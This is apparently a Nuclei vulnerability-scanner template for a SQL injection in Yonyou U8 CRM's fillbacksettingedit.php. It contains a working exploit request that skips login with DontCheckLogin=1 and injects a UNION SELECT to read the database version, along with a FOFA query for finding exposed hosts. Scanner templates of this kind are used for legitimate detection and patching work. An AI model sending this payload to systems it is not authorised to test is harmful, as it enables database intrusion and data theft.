id: yonyou-u8-crm-fillbacksettingedit-sqli
info:
  name: 用友 U8 CRM fillbacksettingedit.php - sqli
  author: leadlife
  severity: high
  description: 用友U8-CRM系统 /config/fillbacksetting.php 存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。
  reference: 
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BU8-CRM%E7%B3%BB%E7%BB%9Ffillbacksetting.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: app="用友U8CRM"
  tags: yonyou,oa,u8crm,sqli

http:
  - raw:
      - |
        GET /config/fillbacksettingedit.php?DontCheckLogin=1&action=edit&id=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,@@VERSION,NULL,NULL--+ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Accept: */*
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: PHPSESSID=bgsesstimeout-;
        Connection: close

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body,'Microsoft SQL Server')
        condition: and